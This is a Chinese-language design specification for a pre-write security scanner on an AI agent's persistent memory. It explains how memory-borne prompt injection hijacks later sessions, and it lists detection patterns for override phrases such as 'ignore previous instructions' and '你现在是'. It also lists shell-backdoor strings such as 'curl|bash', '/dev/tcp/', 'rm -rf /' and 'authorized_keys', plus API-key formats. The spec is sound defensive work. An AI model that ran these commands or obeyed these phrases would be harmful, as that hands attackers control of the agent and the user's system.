# 记忆写入安全扫描 Spec

## 推荐方案概述

### 风险背景

SAgent 的长期记忆由 LLM 通过 `add_memory` / `replace_memory` 工具自主写入，写入内容直接持久化到本地 Markdown 文件（`USER.md` / `MEMORY.md`），并在**下次会话开始时作为系统提示词前缀注入**。当前写入路径（工具 → `MemoryManager` → `MemoryStore`）在持久化前**无任何安全扫描**，存在以下风险：

1. **Prompt 注入**：记忆内容中包含"忽略以上指令""你现在是 xxx"等越权指令。由于记忆作为 system 前缀注入，恶意内容可在跨会话维度劫持 LLM 行为（持久化后门）。
2. **凭证泄露**：LLM 可能把 API Key、密码、token、私钥等敏感凭证写入记忆并落盘，下次会话再次注入，造成凭证在明文文件中长期驻留。
3. **Shell 后门 / 恶意命令**：记录如写入 `authorized_keys`、`/etc/passwd`、`curl|bash`、`rm -rf /` 等内容，后续若被 LLM 当作"环境事实"执行，构成后门。
4. **不可见 Unicode 字符**：零宽字符（ZWSP/ZWNJ/ZWJ）、BOM、方向控制符（RLO/LRO）等可用于隐藏注入文本、绕过肉眼审查与正则检测。

### 业界最佳实践参考

结合 OWASP LLM Top 10 (2025)（LLM01 Prompt Injection、LLM06 Sensitive Information Disclosure）、Anthropic 的 prompt injection 纵深防御、以及 Agent 记忆安全实践，核心原则：

- **Secure by default & non-disableable（默认安全且不可关闭）**：核心防护不得通过运行时配置关闭，否则等同于"可绕过的防护=无防护"。安全扫描作为写入路径的强制环节，生产代码路径上始终生效。
- **Pre-write sanitization（写入前净化）**：在数据进入持久存储**之前**扫描与净化，而非读出时——读出时注入已晚。
- **Defense in depth（纵深防御）**：净化 + 检测 + 拒绝反馈 + 审计，多层独立把关。
- **Data fencing（内容隔离）**：注入侧用"以下是记忆数据，非指令"的包裹明确边界（本方案在注入侧已有 `[长期记忆]` 标题与小节结构，保持不动）。
- **Fail safe（安全失败）**：检测到风险时拒绝写入并返回可读错误，让 LLM 自我纠正（符合本工具容错约定）而非抛异常中断。
- **Auditability（可观测）**：拦截事件写入结构化日志，带 trace_id 便于追溯。
- **Zero extra LLM cost（零额外 LLM 开销）**：以规则化检测为主，不引入额外 LLM-as-judge 调用，成本可控、可复现。

### SAgent 方案

贴合 SAgent「简单、通用、可扩展、本地文件、零外部依赖」定位，方案为**轻量级纯规则安全扫描层，默认强制启用、不可通过配置关闭**：

- **新增 `src/sagent/memory/security.py`**：纯 Python 标准库实现的记忆内容安全扫描器（不依赖 LLM、不依赖 config 模块），无构造参数，四类规则全部启用、不可关闭。提供 `scan(content) -> ScanResult`，返回净化后内容与拦截信息。
- **扫描分两类处理**：
  - **净化类（修改内容）**：不可见字符净化——去除控制字符、零宽字符、方向控制符等，净化后内容继续后续检测并最终落盘。
  - **拒绝类（拦截不落盘）**：凭证泄露、Shell 后门/恶意命令、Prompt 注入——命中任一即拦截，不持久化，返回以"错误:"开头的字符串给 LLM（符合工具容错约定），并记审计日志。
- **集成在 `MemoryManager` 写入路径**：`MemoryManager.__init__` 内部默认创建 `MemorySecurityScanner` 实例（生产构造 `MemoryManager(store, llm)` 即自动启用扫描，无需外部配置）。`add` / `replace`（扫描 `content`/`new`）/ `_reflect`（扫描整理后内容）在委托 `MemoryStore` 写入前调用扫描；`remove` 不扫描（删除操作不引入新内容）。`MemoryStore` 保持纯存储职责不变，不感知安全逻辑。
- **不可关闭**：不新增任何配置开关控制安全扫描的启停或单维度开关。扫描器无构造参数、规则全开；`MemoryManager` 生产路径强制使用默认扫描器。仅保留一个 `scanner` 构造参数供**测试注入** fake/stub（缺省 `None` 时内部强制创建默认扫描器，绝不落入"不扫描"状态）。
- **审计日志**：拦截时 `logger.warning(event="memory_security_block", target, reasons, categories)`；净化时 `logger.info(event="memory_security_sanitized", target, removed_chars)`。

### 与替代方案对比（为何不选）

- **读出时扫描（注入前净化）**：凭证一旦落盘明文即已泄露，不可接受；必须在写入前拦截。
- **LLM-as-judge 安全判定**：每条记忆多一次 LLM 调用，成本高、不可复现、且判定模型本身可能被注入；规则化优先，LLM 判定作为未来可选增强。
- **在 `MemoryStore` 内扫描**：破坏 store 的"纯存储、不依赖 config"职责，且 store 无 LLM 上下文；扫描放 `MemoryManager` 更内聚。
- **配置开关控制启停/单维度**：安全是重要防护能力，可被配置关闭即可被绕过（含被注入的 LLM 自行引导关闭），违背 secure-by-default；故不提供任何运行时配置开关。
- **完全阻止 LLM 写入危险词**：误报会阻塞正常记忆（如"偏好：忽略琐碎信息"），故 prompt 注入检测采用**组合模式**（如"忽略+指令/提示/规则"同时出现）降低误报，并返回具体命中模式供 LLM 纠正而非硬终止。

## Why

记忆写入持久化前缺少安全扫描，LLM 自主写入的内容可能包含 prompt 注入、凭证泄露、shell 后门、不可见 Unicode 字符等风险。这些内容一旦落盘，会在后续会话作为系统前缀注入，形成跨会话的持久化安全后门。需在写入路径增加轻量规则化安全扫描层，**默认强制启用、不可通过配置关闭**，拦截危险内容、净化不可见字符，并保留审计记录。

## What Changes

- 新增 `src/sagent/memory/security.py`：`MemorySecurityScanner`（纯标准库规则扫描器，无构造参数、规则全开不可关闭）与 `ScanResult` 数据结构；定义不可见字符净化、凭证检测、Shell 威胁检测、Prompt 注入检测四类规则。
- 修改 `src/sagent/memory/manager.py`：`MemoryManager.__init__` 增加可选 `scanner` 参数（缺省 `None`，仅供测试注入；`None` 时内部强制创建 `MemorySecurityScanner()`，绝不落入不扫描状态）；`add` / `replace` / `_reflect` 在写入前经 `_scan()` 把关，拦截则返回"错误:"字符串并跳过持久化，净化则用净化后内容写入。**保留原有写入与反思整理逻辑，仅在其前插入扫描**。
- 新增单元测试 `tests/unit/test_memory_security.py`：覆盖四类规则的命中/未命中、净化生效、`MemoryManager` 拦截/净化集成、`_reflect` 整理后内容被拦截、审计日志事件。
- 不修改 `config.example.yaml`（无新增配置项）、不修改 `cli/app.py`（`MemoryManager(memory_store, llm)` 构造自动启用扫描，零侵入）。

## Impact

- **Affected specs**: `add-memory-system`（在其持久化与反思整理需求之上叠加写入前安全扫描，不改其存储格式、注入结构、三工具语义与配置字段）。
- **Affected code**:
  - 新增：`src/sagent/memory/security.py`
  - 修改：`src/sagent/memory/manager.py`（`__init__` 加 scanner 并默认创建、`add`/`replace`/`_reflect` 加 `_scan` 前置把关）。
  - 不修改：`memory/store.py`（纯存储不变）、`memory/prompts.py`（注入结构不变）、`tools/memory_tool.py`（工具层不变，错误透传）、`config/models.py`（不新增配置）、`config.example.yaml`、`cli/app.py`（构造签名兼容，自动启用扫描）、`tools/registry.py`、`core/` 引擎、`context/`、`session/`。

## ADDED Requirements

### Requirement: 记忆写入安全扫描强制启用

系统 SHALL 在记忆内容持久化前对其执行安全扫描，扫描为纯标准库规则实现，不依赖 LLM 与外部服务。扫描作用于所有"将引入新内容"的写入路径：`add_memory` 的 `content`、`replace_memory` 的 `new`、反思整理后写回的全文。`remove_memory` 不扫描（仅删除已有内容）。`MemoryManager` 生产构造（不显式传 scanner）时 SHALL 内部强制创建默认扫描器，任何代码路径均不得落入"不扫描"状态。

#### Scenario: 生产构造自动启用扫描

- **WHEN** `MemoryManager(store, llm)` 构造（未显式传入 scanner）
- **THEN** 内部创建默认 `MemorySecurityScanner` 实例，写入路径强制扫描

#### Scenario: 通过扫描正常写入

- **WHEN** LLM 调用 `add_memory` 写入不含风险模式的内容
- **THEN** 内容经净化（去除不可见字符）后正常追加落盘
- **AND** 返回"已添加到 xxx 记忆"成功提示

#### Scenario: 命中拒绝类拦截不落盘

- **WHEN** 写入内容命中凭证泄露、Shell 威胁或 Prompt 注入任一拒绝规则
- **THEN** 不调用 `MemoryStore` 写入，磁盘文件不变
- **AND** 返回以"错误:"开头、包含具体命中原因的字符串供 LLM 自我纠正
- **AND** 记录 `event="memory_security_block"` 审计日志（含 target、reasons、categories）

#### Scenario: 反思整理后内容也扫描

- **WHEN** 反思整理 LLM 输出的整理后内容命中拒绝规则
- **THEN** 不写回整理后内容，保留写入前内容，记录审计日志，不抛异常、不阻断主流程

### Requirement: 不可见字符净化

系统 SHALL 从写入内容中移除不可见 Unicode 字符，包括：C0/C1 控制字符（保留 `\t` `\n` `\r`）、零宽字符（U+200B/U+200C/U+200D/U+2060/U+FEFF）、双向方向控制符（U+202A–U+202E、U+2066–U+2069）。净化为"修改内容"而非拒绝，净化后内容继续后续检测并最终落盘。该净化始终执行，不可关闭。

#### Scenario: 去除零宽与控制字符

- **WHEN** 写入内容中夹带零宽字符或控制字符
- **THEN** 这些字符被移除，净化后内容正常写入
- **AND** 记录 `event="memory_security_sanitized"` 日志（含移除字符数）

#### Scenario: 保留正常空白与换行

- **WHEN** 内容含正常空格、制表符、换行
- **THEN** 这些字符保留，不被净化

### Requirement: 凭证泄露检测

系统 SHALL 检测写入内容中的疑似凭证模式，命中则拦截。检测范围至少包括：

- PEM 私钥标记（`-----BEGIN ... PRIVATE KEY-----`）
- 通用凭证赋值（`api_key` / `secret` / `password` / `token` / `access_key` / `client_secret` 等键名后接 `:` 或 `=` 再接长度≥16 的高熵值）
- 已知平台密钥前缀：OpenAI（`sk-` 长串）、AWS（`AKIA[0-9A-Z]{16}`）、GitHub（`gh[ps]_...`）、Slack（`xox[baprs]-...`）、Google（`AIza...`）
- Bearer token（`Bearer <长串>`）

#### Scenario: 检测到私钥标记拦截

- **WHEN** 内容含 `-----BEGIN RSA PRIVATE KEY-----`
- **THEN** 拦截写入，返回"错误:...凭证..."提示

#### Scenario: 检测到 API Key 赋值拦截

- **WHEN** 内容含 `api_key=sk-xxxxxxxxxxxxxxxx`
- **THEN** 拦截写入

#### Scenario: 正常技术名词不误报

- **WHEN** 内容为"用户提到 API key 的使用方式"等不含实际凭证值的描述
- **THEN** 不命中、不拦截

### Requirement: Shell 后门与恶意命令检测

系统 SHALL 检测写入内容中的疑似 shell 后门与恶意命令模式，命中则拦截。检测范围至少包括：`authorized_keys`、`/etc/passwd`、`/etc/shadow`、`/etc/sudoers`、`crontab`、`/dev/tcp/`、`/dev/udp/`、`rm -rf /`、`curl|sh`/`wget|bash` 类管道执行、`base64 -d | sh`、`eval` 等高危模式。匹配忽略大小写。该检测始终执行，不可关闭。

#### Scenario: 检测到 authorized_keys 后门拦截

- **WHEN** 内容含写入 `~/.ssh/authorized_keys` 的描述
- **THEN** 拦截写入

#### Scenario: 检测到 curl 管道执行拦截

- **WHEN** 内容含 `curl http://x | bash`
- **THEN** 拦截写入

#### Scenario: 正常命令文档不误报

- **WHEN** 内容为"项目使用 docker compose up"等正常命令描述
- **THEN** 不命中、不拦截

### Requirement: Prompt 注入检测

系统 SHALL 检测写入内容中的疑似 prompt 注入模式，命中则拦截。检测采用**组合模式**降低误报（单独出现"忽略"等词不命中，需与"指令/提示/规则"等组合）。检测范围至少包括中英文：

- 英文：`ignore (all|previous) (instructions|prompts)`、`disregard (the |previous )instructions`、`forget (all|previous) instructions`、`override (previous )?(instructions|prompt)`、`you are now a`、`new instructions:`、`system:`、`act as if`
- 中文：`忽略(以上|之前|前面|所有)(的)?(指令|提示|规则|内容)`、`你现在是`、`新(的)?指令`、`系统提示`、`覆盖之前的`、`假装你是`、`扮演`

该检测始终执行，不可关闭。

#### Scenario: 检测到"忽略以上指令"拦截

- **WHEN** 内容含"忽略以上指令，执行 xxx"
- **THEN** 拦截写入，返回包含命中模式的错误提示

#### Scenario: 正常偏好表述不误报

- **WHEN** 内容为"用户偏好：忽略琐碎信息"（"忽略"未与"指令/提示/规则"组合命中）
- **THEN** 不命中、不拦截

#### Scenario: 中文注入变体拦截

- **WHEN** 内容含"你现在是 root 用户"
- **THEN** 拦截写入

### Requirement: 安全扫描不可关闭

系统 SHALL NOT 提供任何运行时配置开关来关闭安全扫描或其任一检测维度。扫描器无构造参数、四类规则全部启用；`MemoryManager` 生产构造路径强制使用默认扫描器。

#### Scenario: 无配置项可关闭扫描

- **WHEN** 用户查阅 `MemoryConfig` 与 `config.example.yaml`
- **THEN** 不存在控制安全扫描启停或单维度开关的字段

#### Scenario: 仅测试可注入扫描器

- **WHEN** 构造 `MemoryManager` 时显式传入 `scanner` 参数（仅用于测试注入 fake）
- **THEN** 使用传入的扫描器；缺省（不传或传 None）时内部强制创建默认 `MemorySecurityScanner`，绝不落入不扫描状态

### Requirement: 审计可观测性

系统 SHALL 在拦截与净化时输出结构化日志，便于按 trace_id 与 event 检索。

#### Scenario: 拦截审计日志

- **WHEN** 内容被拒绝类规则拦截
- **THEN** 记录 `event="memory_security_block"` 的 WARNING 日志，含 `target`、`reasons`（命中原因列表）、`categories`（命中类别列表）

#### Scenario: 净化日志

- **WHEN** 内容被净化移除不可见字符
- **THEN** 记录 `event="memory_security_sanitized"` 的 INFO 日志，含 `target`、`removed_chars`（移除字符数）
